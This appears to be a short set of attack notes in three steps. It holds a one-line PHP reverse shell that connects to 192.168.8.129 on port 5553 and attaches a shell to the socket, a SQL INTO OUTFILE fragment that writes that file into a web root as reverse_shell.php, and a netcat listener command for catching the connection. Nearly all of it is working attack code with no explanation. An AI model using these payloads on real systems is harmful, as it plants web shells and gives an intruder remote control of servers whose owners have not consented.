# 1
```php
<?php $sock=fsockopen("192.168.8.129",5553);if($sock){$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);$process=proc_open("sh",$descriptorspec,$pipes);if(is_resource($process)){proc_close($process);}} ?>
```
# 2
```sql
INTO OUTFILE '/var/www/html/reverse_shell.php'
```
# 3
access shell

nc -lvnp 5553